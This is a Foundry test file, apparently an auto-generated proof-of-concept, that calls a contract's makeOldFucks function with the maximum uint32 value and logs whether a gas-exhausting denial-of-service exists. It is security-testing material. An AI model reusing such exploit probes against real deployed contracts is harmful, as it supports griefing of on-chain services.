// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xf2570186500a46986f3139f65afedc2afe4f445d.sol";

contract RealOldFuckMakerTest is Test {
    RealOldFuckMaker rom;

    function setUp() public {
        rom = new RealOldFuckMaker();
    }

    function test_DenialOfServiceViaLargeMakeFucks() public {
        // Part (i): Pre-trigger state snapshot
        console2.log("--- BEFORE-Trigger State ---");
        uint256 totalFucksBefore = rom.totalFucksMade();
        console2.log("Total fucks made (before):", totalFucksBefore);
        assertEq(totalFucksBefore, 0);
        
        // Part (ii): Trigger operation
        console2.log("--- Trigger: Call makeOldFucks(MAX_UINT32) ---");
        
        // Setup fork
        vm.fee(20 gwei);
        vm.txGasPrice(20 gwei);
        uint256 gasStart = gasleft();
        
        // Attempt attack
        (bool success, ) = address(rom).call(
            abi.encodeWithSelector(rom.makeOldFucks.selector, type(uint32).max)
        );
        uint256 gasUsed = gasStart - gasleft();
        console2.log("Transaction reverted:", !success);
        console2.log("Gas consumed:", gasUsed);
        
        // Part (iii): Post-trigger state snapshot
        console2.log("--- AFTER-Trigger State ---");
        uint256 totalFucksAfter = rom.totalFucksMade();
        console2.log("Total fucks made (after):", totalFucksAfter);
        
        // Part (iv): Comparison verdict
        console2.log("--- Verdict ---");
        if (!success && gasUsed > 30_000_000) {
            console2.log("Vulnerability Exists: Transaction reverts while consuming >30M gas");
        } else if (!success) {
            console2.log("Vulnerability not Exist: Reversion occurs but gas within limits");
        } else {
            console2.log("Vulnerability not Exist: Transaction executed successfully");
        }
    }
}